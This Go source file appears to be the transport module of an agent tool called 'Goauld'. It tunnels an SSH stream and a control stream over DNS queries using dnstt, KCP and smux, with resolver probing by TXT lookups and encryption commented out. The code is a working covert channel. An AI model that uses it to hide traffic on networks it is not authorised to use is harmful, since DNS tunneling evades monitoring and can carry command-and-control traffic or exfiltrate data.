package transport

import (
	"Goauld/agent/config"
	"Goauld/common/log"
	common_net "Goauld/common/net"
	"errors"
	"fmt"
	"github.com/qdm12/dns/v2/pkg/nameserver"
	"net"
	"strconv"
	"strings"
	"time"

	miekgDns "github.com/miekg/dns"

	"github.com/xtaci/kcp-go/v5"
	"github.com/xtaci/smux"
	"www.bamsoftware.com/git/dnstt.git/dns"
	"www.bamsoftware.com/git/dnstt.git/turbotunnel"
)

type DNSSH struct {
	udpConn       net.PacketConn
	pconn         net.PacketConn
	session       *smux.Session
	SshStream     *smux.Stream
	ControlStream *smux.Stream
	kcpConn       *kcp.UDPSession
}

// smux streams will be closed after this much time without receiving data.
const idleTimeout = 2 * time.Minute

// dnsNameCapacity returns the number of bytes remaining for encoded data after
// including the domain in a DNS name.
func dnsNameCapacity(domain dns.Name) int {
	// Names must be 255 octets or shorter in total length.
	// https://tools.ietf.org/html/rfc1035#section-2.3.4
	capacity := 255
	// Subtract the length of the null terminator.
	capacity -= 1
	for _, label := range domain {
		// Subtract the length of the label and the length octet.
		capacity -= len(label) + 1
	}
	// Each label may be up to 63 bytes long and requires 64 bytes to
	// encode.
	capacity = capacity * 63 / 64
	// Base32 expands every 5 bytes to 8.
	capacity = capacity * 5 / 8
	return capacity
}

func Init(domain dns.Name, remoteAddr net.Addr, pconn net.PacketConn) (*DNSSH, error) {

	mtu := dnsNameCapacity(domain) - 8 - 1 - numPadding - 1 // clientid + padding length prefix + padding + data length prefix
	if mtu < 80 {
		return nil, fmt.Errorf("domain %s leaves only %d bytes for payload", domain, mtu)
	}

	log.Get().Trace().Str("Mode", "DNSSH").Msgf("effective MTU %d (%s)", mtu, domain)

	// Open a KCP conn on the PacketConn.
	conn, err := kcp.NewConn2(remoteAddr, nil, 0, 0, pconn)
	if err != nil {
		return nil, fmt.Errorf("opening KCP conn: %v", err)
	}

	log.Trace().Str("Mode", "DNSSH").Msgf("opening session %08x", conn.GetConv())
	// Permit coalescing the payloads of consecutive sending.
	conn.SetStreamMode(true)
	// Disable the dynamic congestion window (limit only by the maximum of
	// local and remote static windows).
	conn.SetNoDelay(
		0, // default nodelay
		0, // default interval
		0, // default resend
		1, // nc=1 => congestion window off
	)
	conn.SetWindowSize(turbotunnel.QueueSize/2, turbotunnel.QueueSize/2)
	if rc := conn.SetMtu(mtu); !rc {
		return nil, fmt.Errorf("setting mtu failed")
	}

	// Put a Noise channel on top of the KCP conn.
	// rw, err := noise.NewClient(conn, pubkey)
	// if err != nil {
	// 	return nil, nil, nil, fmt.Errorf("error creating noise client: %v", err)
	// }

	// Start a smux session on the Noise channel.
	smuxConfig := smux.DefaultConfig()
	smuxConfig.Version = 2
	smuxConfig.KeepAliveTimeout = idleTimeout
	smuxConfig.MaxStreamBuffer = 1 * 1024 * 1024 // default is 65 536
	sess, err := smux.Client( /*rw*/ conn, smuxConfig)
	if err != nil {
		return nil, fmt.Errorf("error opening smux session: %v", err)
	}

	sshStream, err := sess.OpenStream()
	if err != nil {
		return nil, fmt.Errorf("error opening stream: %v", err)
	}

	controlStream, err := sess.OpenStream()
	if err != nil {
		return nil, fmt.Errorf("error opening stream: %v", err)
	}

	a := &DNSSH{
		udpConn:       pconn,
		pconn:         pconn,
		session:       sess,
		SshStream:     sshStream,
		ControlStream: controlStream,
		kcpConn:       conn,
	}
	return a, nil
}

func NewDNSSH() (*DNSSH, error) {
	// noisepubkey := config.Get().Id
	// pubkey, err := noise.DecodeKey(noisepubkey)
	// if err != nil {
	// 	fmt.Fprintf(os.Stderr, "pubkey format error: %v\n", err)
	// 	os.Exit(1)
	// }
	d := "127.0.0.1"
	port := 53
	dnsServers := config.Get().DNSServer()
	for _, _dns := range nameserver.GetDNSServers() {
		dnsServers = append(dnsServers, _dns.String())
	}

	log.Info().Str("Mode", "DNSSH").Str("Servers", strings.Join(dnsServers, ", ")).Msgf("Trying DNS servers")

	for _, domain := range dnsServers {
		p := 53
		ip := ""
		split := strings.Split(domain, ":")
		if len(split) == 2 {
			ip = split[0]
			var err error
			p, err = strconv.Atoi(split[1])
			if err != nil {
				log.Debug().Err(err).Str("Mode", "DNSSH").Str("Domain", domain).Str("Port", split[1]).Msg("error parsing port, using 53 as default...")
				p = 53
			}
		} else {
			ip = domain
		}
		log.Debug().Str("IP", ip).Str("Mode", "DNSSH").Int("Port", p).Msgf("Testing DNS server availability")
		if TestDNSServer(ip, port, config.Get().DNSDomain()) {
			d = ip
			port = p
			break
		}
	}
	log.Debug().Str("DNS", d).Str("Mode", "DNSSH").Int("port", port).Msg("dns server")
	domain, err := dns.ParseName(config.Get().DNSDomain())
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Str("Domain", config.Get().DNSDomain()).Msg("error parsing domain")
		return nil, err
	}
	log.Info().Str("Mode", "DNSSH").Str("Domain", config.Get().DNSDomain()).Msg("DNS tunneling")

	// Iterate over the remote resolver address options and select one and
	// only one.
	var remoteAddr net.Addr
	var udpConn net.PacketConn

	remoteAddr, err = net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", d, port))
	if err != nil {
		return nil, fmt.Errorf("error resolving remote address: %v", err)
	}
	udpConn, err = net.ListenUDP("udp", nil)
	if err != nil {
		return nil, fmt.Errorf("error creating UDP connection: %v", err)
	}

	pconn := NewDNSPacketConn(udpConn, remoteAddr, domain)
	dnsConn, err := Init( /*pubkey,*/ domain, remoteAddr, pconn)
	if err != nil {
		return nil, fmt.Errorf("error initializing DNS tunnel: %s", err)
	}
	dnsConn.pconn = pconn
	return dnsConn, nil
}

func TestDNSServer(ip string, port int, d string) bool {
	// Define the domain and DNS server
	isOpen := common_net.CheckHostPortAvailability("udp", ip, port)
	srv := fmt.Sprintf("%s:%d", ip, port)
	if !isOpen {
		log.Debug().Str("Mode", "DNSSH").Str("Server", srv).Msg("No DNS server found")
		return false
	}
	log.Debug().Str("Mode", "DNSSH").Str("Server", srv).Msg("Testing DNS server (TXT)")
	domain := fmt.Sprintf("ingesrkokreujy6zumkse43vobsxey3bnruwm4tbm5uwy2ltoruwgzlyobuwc3d.jmrxwg2lpovz.%s", d)

	// Prepare the DNS client
	client := new(miekgDns.Client)
	message := new(miekgDns.Msg)
	message.SetQuestion(miekgDns.Fqdn(domain), miekgDns.TypeTXT)

	// Send the DNS query to the specified server
	response, _, err := client.Exchange(message, srv)
	if err != nil {
		log.Debug().Err(err).Str("Mode", "DNSSH").Str("Domain", domain).Str("Server", srv).Msg("error testing DNS server")
		return false
	}

	// Check if we received any TXT records in the response
	if len(response.Answer) > 0 {
		for _, ans := range response.Answer {
			if txtRecord, ok := ans.(*miekgDns.TXT); ok {
				log.Debug().Str("Record", txtRecord.String()).Str("Domain", domain).Str("Server", srv).Msg("record found")
				return true
			}
		}
	}
	log.Debug().Str("Domain", domain).Str("Server", srv).Msg("no record found")
	return false
}

func (d *DNSSH) Close() error {
	return errors.Join(
		d.kcpConn.Close(),
		d.session.Close(),
		d.udpConn.Close(),
		d.pconn.Close(),
		d.SshStream.Close(),
		d.ControlStream.Close(),
	)
}
